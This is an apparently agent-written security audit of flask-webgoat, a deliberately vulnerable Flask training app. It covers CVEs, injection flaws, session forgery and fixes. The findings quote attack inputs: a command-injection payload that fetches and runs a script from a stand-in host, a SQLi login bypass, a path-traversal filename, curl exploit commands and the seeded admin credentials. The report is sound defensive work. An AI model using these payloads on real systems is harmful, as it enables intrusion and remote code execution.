# Security Audit Report — flask-webgoat (factory-ai-demo)

- **Date:** 2026-10-26
- **Target:** `factory-ai-demo` repository, branch `master` (default branch)
- **Mode:** Full-project security audit — every tracked file reviewed (15/15)
- **Methodology:** STRIDE, OWASP Top 10 (2021), supply-chain analysis
- **Tools:** `pip-audit 2.10.1` (OSV + PyPI advisory feeds), PyPI JSON API, ripgrep pattern scans, live endpoint smoke tests
- **Network policy:** Connected mode (registry enrichment succeeded)

## Context — read this first

flask-webgoat is a **deliberately-vulnerable security training application** (stated in `README.md`, which catalogues the planted vulnerabilities). Two consequences for this report:

1. **The planted vulnerabilities are by design.** Fixing them would destroy the app's purpose. This audit therefore **documents** code fixes (with exact patches) instead of applying them.
2. **Dependency updates were applied** (`requirements.txt`) because vulnerable third-party components do not serve the training purpose and were explicitly in scope. The upgrade was verified to keep the app (and its training vulnerabilities) fully functional.

This report is written so the findings are actionable for anyone deploying or hardening this codebase; for the training scenario they serve as the answer key.

---

## 1. Executive summary

| Area | Result |
|---|---|
| Dependencies | **20 unique known CVEs** in the pinned set (Flask, Werkzeug, Jinja2). **Fixed** — upgraded to latest safe versions; re-audit reports **0 known vulnerabilities**. |
| Hardcoded secrets | **1 hardcoded session signing key** (critical), **1 seeded default admin credential**. No cloud/API keys, no private keys, no `.env` files. |
| Authentication/authorization | Severely broken by design: session forgery via hardcoded key, SQLi auth bypass, unauthenticated privileged endpoints, no rate limiting, no CSRF. |
| SQL injection | **2 confirmed** (login, create_user). `/search` and `/login_and_redirect` correctly use parameterized queries. |
| XSS | **None found.** Jinja2 autoescaping is intact in all templates; no `\|safe`, no `innerHTML`, no raw HTML sinks. |
| Command injection / RCE | **2 unauthenticated RCE paths** (shell injection, `pickle.loads`) plus directory traversal and open redirect. |
| CI/CD | No hardcoded tokens (uses variable groups / GitHub secrets — good). Minor supply-chain hardening recommended (unverified binary downloads, unpinned action refs). |

**Findings by severity:** 4 Critical (P0) · 5 High (P1) · 3 Medium (P2) · 5 Low (P3) · 3 informational.

---

## 2. Dependency audit & update (Tasks 1 & 2)

> The user request referenced `package.json`; this is a Python project, so the dependency manifest audited is **`requirements.txt`**. There is no `package.json`, no Node tooling, and no JavaScript.

### 2.1 Before — known vulnerabilities in the pinned set

`pip-audit --no-deps -r requirements.txt` (before) reported **37 raw / 20 unique advisories** in 3 of 6 packages (duplicates come from the same record mirrored across OSV and PyPI advisory feeds):

| Package | Pinned | Unique advisories | CVEs (deduplicated) | Fixed in |
|---|---|---|---|---|
| Flask | 0.12.5 (2019) | 3 | CVE-2019-1010083 (JSON DoS), CVE-2023-30861 (session cookie leak via proxy cache), CVE-2026-27205 (missing `Vary: Cookie` → cache poisoning of session data) | 1.0 / 2.2.5 / **3.1.3** |
| Werkzeug | 0.16.1 (2019) | 10 | CVE-2022-29361 (HTTP request smuggling, disputed), CVE-2023-23934 (nameless-cookie parsing), CVE-2023-25577 (multipart parsing CPU DoS), CVE-2023-46136 (multipart boundary CPU DoS), CVE-2024-34069 (debugger RCE with attacker-controlled subdomain + PIN), CVE-2024-49766 (`safe_join` UNC paths on Windows), CVE-2025-66221 (`safe_join` Windows device names), CVE-2026-21860 (`safe_join` device names with extensions/trailing spaces), CVE-2026-27199 (`safe_join` device names after path segments), CVE-2026-102598 (`safe_join` NTFS ADS marker) | 2.1.1 … **3.1.9** |
| Jinja2 | 2.8 (2015) | 7 | CVE-2016-10745 and CVE-2019-10906 (sandbox escape via `str.format`/`format_map`), CVE-2020-28493 (ReDoS in `urlize`), CVE-2024-22195 and CVE-2024-34064 (`xmlattr` attribute injection), CVE-2024-56326 and CVE-2025-27516 (sandbox escape via `str.format` detection / `\|attr` filter) | 2.8.1 … **3.1.6** |
| itsdangerous | 1.1.0 | 0 | none known — but incompatible with Flask 3.x | — |
| click | 7.1.2 | 0 | none known — but incompatible with Flask 3.x | — |
| MarkupSafe | 1.1.1 | 0 | none known — but incompatible with Jinja2 3.x | — |

Several of these are directly reachable in this app's threat model: the multipart DoS issues (CVE-2023-25577, CVE-2023-46136) target exactly the `request.form` parsing used on every POST endpoint, and CVE-2023-30861/CVE-2026-27205 target the cookie-session authentication this app relies on.

### 2.2 Applied fix — `requirements.txt`

```diff
-click==7.1.2
-Flask==0.12.5
-itsdangerous==1.1.0
-Jinja2==2.8
-MarkupSafe==1.1.1
-Werkzeug==0.16.1
+blinker==1.9.0
+click==8.5.0
+Flask==3.1.3
+itsdangerous==2.2.0
+Jinja2==3.1.6
+MarkupSafe==3.0.4
+Werkzeug==3.1.9
```

Notes:

- Every pinned version is **≥ the minimum fix version of every advisory above** (Flask 3.1.3, Werkzeug 3.1.9, Jinja2 3.1.6).
- `blinker` is a new transitive dependency of Flask ≥ 2.3; it is pinned to keep the file's full-closure pinning style.
- All pinned versions are the **latest releases on PyPI** and were published **more than 7 days ago** (newest: MarkupSafe 3.0.4, 2026-10-02; oldest: itsdangerous 2.2.0, 2024-04-16). All are canonical Pallets packages — no typosquatting or supply-chain freshness concerns, no install scripts.

### 2.3 Verification

| Check | Result |
|---|---|
| `pip-audit -r requirements.txt` (full resolution, incl. transitives) after upgrade | **"No known vulnerabilities found"** |
| App smoke test on the new stack (Flask 3.1.3 / Werkzeug 3.1.9 / Jinja2 3.1.6 / Python 3.12) | All endpoints functional: `/status`, `/ping`, `/search`, `/login`, `/message`, `/grep_processes`, `/login_and_redirect`, `/deserialized_descr` |
| Training behavior preserved (no application code was changed) | Confirmed live: SQLi auth-bypass login, directory-traversal write, and the deserialization endpoint all still behave as documented |
| `README.md` run instructions (`FLASK_APP=run.py flask run`) | Still valid on Flask 3.x |

---

## 3. Hardcoded secrets scan (Task 3)

Patterns scanned (ripgrep, all tracked files incl. hidden, `.git` excluded): AWS access keys (`AKIA…`), Google API keys (`AIza…`), GitHub tokens (`ghp_…`, `github_pat_…`), Slack tokens (`xox*`), OpenAI-style keys (`sk-…`), PEM private-key blocks, generic `password|secret|token|api_key = "…"` assignments, and tracked key material (`.env`, `.pem`, `.key`, `id_rsa*`, `.p12/.pfx`).

**Negative results (clean):**

- No cloud/service provider API keys or tokens.
- No private keys or keystores tracked in the repo.
- No `.env` files tracked.
- `azure-pipelines.yml` correctly pulls ShiftLeft tokens from the `shiftleft-token` variable group; `.github/workflows/main.yml` correctly uses `${{ secrets.FACTORY_API_KEY }}` / `${{ secrets.GITHUB_TOKEN }}`. Good practice — no CI credentials are embedded.

**Positive findings:**

- **F-03 (Critical):** Hardcoded Flask `SECRET_KEY` at `flask_webgoat/__init__.py:22` (value redacted from this report). See finding catalog.
- **F-09 (High):** Seeded default admin account `admin` / `maximumentropy` with `access_level = 0` (superuser) at `flask_webgoat/__init__.py:33-35`, and the credentials are published in `README.md`. Harmless for a training app, critical if this is ever deployed anywhere reachable.

---

## 4. Authentication & authorization review (Task 4)

The app uses cookie-based Flask sessions storing a `user_info = (id, username, access_level)` tuple. `access_level = 0` is superuser (only level 0 may call `/create_user`); higher numbers are less privileged. Findings:

| ID | Severity | Issue |
|---|---|---|
| F-03 | P0 | Hardcoded session signing key → anyone can forge a valid admin session cookie offline; all subsequent "auth checks" are bypassable without ever sending a credential. |
| F-04 | P0 | SQL injection in `/login` → authentication bypass (verified live with `' OR 1=1 --`, which logs in as the superuser). |
| F-09 | P1 | Plaintext password storage + seeded default superuser credentials; passwords compared as raw strings. |
| F-10 | P2 | `/search` requires no authentication and enumerates every username and access level. |
| F-11 | P2 | No rate limiting or account lockout on `/login` and `/login_and_redirect` → unlimited credential stuffing/brute force. |
| F-12 | P2 | No CSRF protection on any state-changing endpoint (`/login`, `/message`, `/create_user`, `/deserialized_descr`). Modern browsers' default `SameSite=Lax` mitigates cross-site POSTs, but this is browser-policy-dependent, not a guarantee. |
| F-07 | P1 | `/login_and_redirect` is a GET that accepts username/password as URL query parameters → credentials land in access logs, browser history, and proxies (CWE-598), alongside the open redirect. |

Authorization gaps: `/grep_processes` and `/deserialized_descr` have **no authentication at all** (both are RCE-class — see F-01/F-02), and `/message` trusts the session's `access_level` tuple, which F-03/F-04 let an attacker set arbitrarily. `/create_user` correctly requires `access_level == 0`, but that gate is reachable via any of the bypasses above or the documented default credentials.

---

## 5. SQL injection & XSS review (Task 5)

### SQL injection — confirmed (2)

- **F-04 (P0)** `flask_webgoat/auth.py:18-20` — `/login` builds its query with `%` string formatting from `username`/`password`. Verified: `username=' OR 1=1 --` authenticates as the first row (the superuser).
- **F-05 (P1)** `flask_webgoat/users.py:39-42` — `/create_user` builds its `INSERT` with `%s`/`%d` formatting from `username`/`password`. Behind the admin gate, but that gate is bypassable (F-03/F-04/F-09). An injected `password` can create arbitrary rows with arbitrary access levels.

Parameterized queries are used correctly in `/search` (`ui.py:17`) and `/login_and_redirect` (`auth.py:42`) — no injection there.

### XSS — none found

All three templates (`base.html`, `error.html`, `search.html`) render via Jinja2 `{{ … }}` autoescaping; there is no `|safe`, no `markupsafe.Markup` on user data, no `innerHTML`-style sink, and API responses go through `jsonify` (JSON content type). Reflected values (`query`, `message`, `results`) are all escaped. Note the defense-in-depth caveats in F-13/F-14 (permissive CORS, CSP with `'unsafe-inline'`) — while no XSS sink exists today, the CSP would not contain one if a template regression introduced it.

### Related injection-class issues

- **F-01 (P0)** OS command injection (below), **F-02 (P0)** deserialization RCE, **F-06 (P1)** path traversal — all reach untrusted input into dangerous sinks without validation.

---

## 6. Findings catalog

Severity → priority mapping: Critical=P0, High=P1, Medium=P2, Low=P3. Line numbers refer to the current `master` tree.

### F-01 [P0] [security] Unauthenticated OS command injection → RCE
**File:** `flask_webgoat/actions.py:41-48` (`GET /grep_processes`) · **CWE-78** · **OWASP A03**

```python
name = request.args.get("name")
res = subprocess.run(
    ["ps aux | grep " + name + " | awk '{print $11}'"],
    shell=True, ...
)
```

Unauthenticated user input is concatenated into a string executed by `sh -c`. `shell=True` with a list passes the first element as the shell command. Anyone can run arbitrary commands with the server's privileges, e.g. `GET /grep_processes?name=; curl http://evil/x.sh|bash;`. No session, no credentials required.

**Fix (documented, not applied):** never pass user input to a shell. Split the pipeline into safe primitives and filter in Python:

```python
@bp.route("/grep_processes")
def grep_processes():
    name = request.args.get("name") or ""
    if not re.fullmatch(r"[A-Za-z0-9._-]+", name):   # allow-list validation
        return jsonify({"error": "invalid name"}), 400
    res = subprocess.run(["ps", "aux"], capture_output=True, text=True, check=False)
    names = [line.split()[10] for line in res.stdout.splitlines()[1:] if name in line]
    return jsonify({"success": True, "names": names})
```

Also add authentication and an access-level gate to the route.

### F-02 [P0] [security] Unauthenticated insecure deserialization → RCE
**File:** `flask_webgoat/actions.py:54-61` (`POST /deserialized_descr`) · **CWE-502** · **OWASP A08**

```python
data = base64.urlsafe_b64decode(request.form.get('pickled'))
deserialized = pickle.loads(data)
```

`pickle.loads` on attacker-supplied bytes executes arbitrary code during unpickling (e.g. via a crafted `__reduce__` calling `os.system`). No authentication required.

**Fix (documented, not applied):** never unpickle untrusted data; use a data format with no code-execution semantics:

```python
import json
deserialized = json.loads(base64.urlsafe_b64decode(request.form["payload"]))
```

### F-03 [P0] [security] Hardcoded Flask SECRET_KEY enables session forgery
**File:** `flask_webgoat/__init__.py:22` · **CWE-798** · **OWASP A02/A05**

`app.secret_key = "<REDACTED — hardcoded literal in source>"` (value withheld from this report; it is a fixed literal in the repo).

Flask sessions are client-side cookies that are *signed, not encrypted*. Knowing the key lets anyone mint a cookie with `user_info = (1, 'admin', 0)` — a silent, unauthenticated superuser bypass of every access check in the app (`/message`, `/create_user`, …). Anyone with repo read access has the key.

**Fix (documented, not applied):**

```python
app.secret_key = os.environ["SECRET_KEY"]            # fail closed in prod
# or, for a single-process training app:
app.secret_key = secrets.token_hex(32)               # rotate per process
```

### F-04 [P0] [security] SQL injection in /login → authentication bypass
**File:** `flask_webgoat/auth.py:18-20` · **CWE-89** · **OWASP A03/A07** — **verified live in this audit**

```python
query = ("SELECT id, username, access_level FROM user WHERE username = '%s' AND password = '%s'"
         % (username, password))
```

`username=' OR 1=1 --` returns the first row — the seeded superuser. Verified against the running app this audit.

**Fix (documented, not applied):** parameterize, and compare a password *hash* rather than the raw password (see F-09):

```python
query = "SELECT id, username, password, access_level FROM user WHERE username = ?"
row = query_db(query, (username,), one=True)
if row is None or not check_password_hash(row[2], password):
    return jsonify({"bad_login": True}), 400
```

### F-05 [P1] [security] SQL injection in /create_user
**File:** `flask_webgoat/users.py:39-42` · **CWE-89** · **OWASP A03**

`"INSERT INTO user (username, password, access_level) VALUES ('%s', '%s', %d)" % (username, password, int(access_level))` — `username`/`password` are form-supplied and injectable; a crafted `password` can inject arbitrary column values (e.g. more superusers).

**Fix (documented, not applied):**

```python
query = "INSERT INTO user (username, password, access_level) VALUES (?, ?, ?)"
query_db(query, (username, generate_password_hash(password), int(access_level)), commit=True)
```

(Also validate `access_level` with an allow-list such as `{0,1,2,3}` instead of bare `int()`.)

### F-06 [P1] [security] Directory traversal → arbitrary file write
**File:** `flask_webgoat/actions.py:30-37` (`POST /message`) · **CWE-22** · **OWASP A03** — **verified live in this audit**

`filename = request.form["filename"] + ".txt"` is joined into `data/<user_id>/…` with no sanitization. `filename=../../traversal_proof` wrote `/tmp/traversal_proof.txt` during verification. Any logged-in user can overwrite/create `*.txt` files anywhere the process can write (e.g. `/home/user/.bashrc.txt`, cron spools, other users' `data/` directories).

**Fix (documented, not applied):**

```python
filename = Path(filename_param).name                 # strip all path components
user_dir = (Path("data") / str(user_info[0])).resolve()
path = (user_dir / f"{filename}.txt").resolve()
if not path.is_relative_to(user_dir):                # containment check
    abort(400)
path.parent.mkdir(parents=True, exist_ok=True)       # also fixes the latent mkdir bug (see §8)
```

### F-07 [P1] [security] Open redirect + credentials in GET query string
**File:** `flask_webgoat/auth.py:29-46` (`GET /login_and_redirect`) · **CWE-601 / CWE-598** · **OWASP A01**

On failed login the endpoint redirects to the fully attacker-controlled `url` parameter — a phishing vector that leaks nothing about the failure and can be used to farm credentials on a look-alike page. Additionally the endpoint is a GET that takes `username` and `password` as query parameters, so credentials land in access logs, proxies, and browser history.

**Fix (documented, not applied):** make it POST, read credentials from the form, and only allow relative redirects:

```python
target = url or "/"
parsed = urlparse(target)
if parsed.scheme or parsed.netloc or not target.startswith("/"):
    abort(400)
return redirect(target)
```

### F-08 [P1] [security] All SQL, including plaintext passwords, logged to stdout
**File:** `flask_webgoat/__init__.py:11-14` · **CWE-532** · **OWASP A02/A09**

`conn.set_trace_callback(print)` prints every executed statement *with interpolated parameter values* to stdout. This audit's smoke test captured `SELECT id, username, access_level FROM user WHERE username = 'admin' AND password = 'maximumentropy'` (and the injected `' OR 1=1 --` payload) in the log stream. In containerized deployments these logs commonly ship to central aggregation — a credential exfiltration channel.

**Fix (documented, not applied):** remove the callback in production; if query tracing is needed, trace statements without binding parameters (e.g. `print(query)` only, never `args`).

### F-09 [P1] [security] Plaintext password storage + default superuser credentials
**File:** `flask_webgoat/__init__.py:33-35`, `auth.py`, `users.py` · **CWE-256 / CWE-798** · **OWASP A02/A07**

Passwords are stored and compared as raw strings, and the database is re-seeded on every start with `admin` / `maximumentropy` at `access_level = 0` (superuser) — credentials also published in `README.md`. Any deployment of this code is instantly admin-accessible to anyone who has read the README, and any DB read (e.g. via F-04/F-05 or the missing auth on `/search`) discloses all passwords directly.

**Fix (documented, not applied):** hash with `werkzeug.security.generate_password_hash` / verify with `check_password_hash`; take the seeded admin password from an environment variable (or require first-run setup); never commit credentials.

### F-10 [P2] [security] Unauthenticated data exposure via /search
**File:** `flask_webgoat/ui.py:14-26` · **CWE-200** · **OWASP A01**

`/search` requires no session and returns every matching `username` + `access_level` — user enumeration and superuser identification for follow-on attacks.

**Fix (documented, not applied):** require login (`session["user_info"]`) before querying; return only usernames the caller is authorized to see.

### F-11 [P2] [security] No rate limiting on authentication endpoints
**File:** `flask_webgoat/auth.py` (`/login`, `/login_and_redirect`) · **CWE-307** · **OWASP A07/A04**

Unlimited attempts enable credential stuffing and brute force; combined with a 3-character minimum password policy (`users.py:31`), guessing is cheap.

**Fix (documented, not applied):** add `flask-limiter` (e.g. `5 per minute` on `/login`, keyed by IP), raise the minimum password length, and add a minimum password strength check in `/create_user`.

### F-12 [P2] [security] No CSRF protection on state-changing endpoints
**File:** `actions.py`, `auth.py`, `users.py` (all POST handlers) · **CWE-352** · **OWASP A01**

All POST endpoints authenticate via session cookie with no CSRF token or origin check. A malicious page can trigger `/message` (file write) or `/create_user` (account creation) in a victim's browser. Note browsers' default `SameSite=Lax` blocks cross-site POST cookies today, but that is a browser default, not an application guarantee — and the app sets no explicit `SameSite` policy.

**Fix (documented, not applied):** enable `Flask-WTF`'s `CSRFProtect` on the app, or set `SESSION_COOKIE_SAMESITE = "Strict"` plus a double-submit token for API clients.

### F-13 [P3] [security] Permissive CORS wildcard
**File:** `run.py:8` · **CWE-942** · **OWASP A05**

`Access-Control-Allow-Origin: *` on every response. Nuance: because the header set lacks `Access-Control-Allow-Credentials`, modern browsers will not attach the session cookie to cross-origin reads, so this is not directly a data-exfil channel — but it needlessly widens the surface and breaks the origin model if a credentialed endpoint is ever added.

**Fix (documented, not applied):** delete the header, or echo an allow-listed origin (`request.origin in TRUSTED_ORIGINS`).

### F-14 [P3] [security] CSP allows inline scripts
**File:** `run.py:10` · **CWE-693** · **OWASP A05**

`Content-Security-Policy: script-src 'self' 'unsafe-inline'` disables the CSP's XSS containment benefit. No XSS sink exists today (see §5), so this is defense-in-depth.

**Fix (documented, not applied):** `Content-Security-Policy: default-src 'self'` (add nonce-based allowances only if inline scripts are ever required), plus `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'` — or use `flask-talisman`.

### F-15 [P3] [security] Missing transport/cookie hardening; dev server in entrypoint
**Files:** `run.py:17` (`app.run()`), app config · **OWASP A02/A05**

No `SESSION_COOKIE_SECURE`; no `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, or `X-Frame-Options`/`frame-ancestors` (clickjacking); the entrypoint serves via the Werkzeug development server, which is single-process, non-hardened, and unsuitable for production. (The debugger is not enabled, so the Werkzeug debugger CVEs were not directly reachable, but see §2 for why the versions were still upgraded.)

**Fix (documented, not applied):** set `SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_HTTPONLY = True`, `SESSION_COOKIE_SAMESITE = "Lax"` (all defaultable via `flask-talisman`), and serve with `gunicorn`/`waitress` behind TLS.

### F-16 [P3] [security] CI supply chain: unverified binary downloads, unpinned refs
**Files:** `azure-pipelines.yml` (ShiftLeft CLI zip, linuxkit release zip), `.github/workflows/main.yml` (`actions/checkout@v4`, `curl … app.factory.ai/cli | sh`) · **OWASP A08**

CI downloads binaries over HTTPS without checksum/signature verification and references actions by mutable tags. If either CDN or a dependency is compromised, pipeline code execution follows. No credentials are embedded (good — tokens come from variable groups/secret stores).

**Fix (recommended):** verify downloaded artifact hashes/signatures; pin `actions/checkout` to a commit SHA; prefer `pip-audit`/native tasks over downloading third-party scanners at runtime.

### F-17 [P3] [security] Dependencies pinned without hashes
**File:** `requirements.txt` · **OWASP A08**

Versions are pinned but not hash-pinned, so a compromised index could substitute artifacts (`pip-audit` itself flags this). Note the scheduled security workflow already covers staleness; add integrity:

**Fix (recommended):** generate a lockfile with `pip-compile --generate-hashes` and install with `pip install --require-hashes`.

---

## 7. Additional observations (non-security / latent bugs)

These are correctness bugs found during audit — reported for completeness, not counted as vulnerabilities:

1. **`/message` fails on a fresh checkout** (`actions.py:30`): `Path("data/1").mkdir()` runs without `parents=True`, so the first request 500s unless `data/` already exists. This is pre-existing (stdlib semantics, unrelated to the dependency upgrade) and currently breaks the directory-traversal exercise on fresh clones. The F-06 fix snippet resolves it via `mkdir(parents=True, exist_ok=True)`.
2. **Error paths raise `TypeError`** (`ui.py:28`, `users.py:47`): `"…" + err` concatenates a `str` with an `sqlite3.Error` object, so the SQL error handler itself crashes with a 500. Use f-strings: `f"… {err}"`.
3. **Access-level semantics are inverted and inconsistent** (`actions.py:23-24`): the error text says "access level < 2 is required" while the code permits levels 0–2 and rejects > 2; `0` is also the *most* privileged level, which is easy to misuse when hardening. Consider an explicit role model.

---

## 8. Coverage

Every tracked file on `master` was reviewed (15/15):

- `run.py`, `requirements.txt`, `README.md`, `LICENSE` (not source), `azure-pipelines.yml`, `.github/workflows/main.yml`
- `flask_webgoat/`: `__init__.py`, `actions.py`, `auth.py`, `status.py`, `ui.py`, `users.py`, `templates/base.html`, `templates/error.html`, `templates/search.html`

OWASP LLM Top 10 was not applied — the application has no LLM integration. No `.factory/threat-model.md` exists in the repo. A deeper multi-phase audit (`deep-security-review`) is available on request if more than this STRIDE/OWASP-level review is needed.

---

## 9. Reproducing the verification

```bash
# Dependency CVE audit (before/after)
pip install pip-audit
pip-audit -r requirements.txt                 # after this audit: "No known vulnerabilities found"
git stash -- requirements.txt && pip-audit --no-deps -r requirements.txt && git stash pop

# Hardcoded-secret patterns
rg -n 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|xox[baprs]-|sk-[A-Za-z0-9_-]{20,}|-----BEGIN [A-Z ]*PRIVATE KEY'

# Live exploit proof (training app — run locally only)
FLASK_APP=run.py flask run
# SQLi auth bypass (F-04), verified in this audit:
curl -s -X POST -d "username=' OR 1=1 --&password=" http://127.0.0.1:5000/login
# Command injection (F-01):
curl -s "http://127.0.0.1:5000/grep_processes?name=;id"
```

## 10. Summary of changes made by this audit

| Change | File | Status |
|---|---|---|
| Upgraded 6 dependencies to latest safe versions; pinned new transitive `blinker` | `requirements.txt` | **Applied** (verified: 0 known CVEs, app functional, training vulns intact) |
| All 17 code findings | `flask_webgoat/**`, `run.py`, CI files | **Documented with exact fixes — not applied** (deliberately-vulnerable training app; applying would break its purpose) |
| Recommended follow-ups | CI | Add `pip-audit` to CI on every push; add secret scanning (gitleaks) and lockfile hashes (F-17) |

If the intent is to *deploy* this codebase rather than train on it, apply fixes F-01 through F-12 in that order — F-01/F-02/F-03/F-04 are the ones that hand over the server or admin without any credentials.
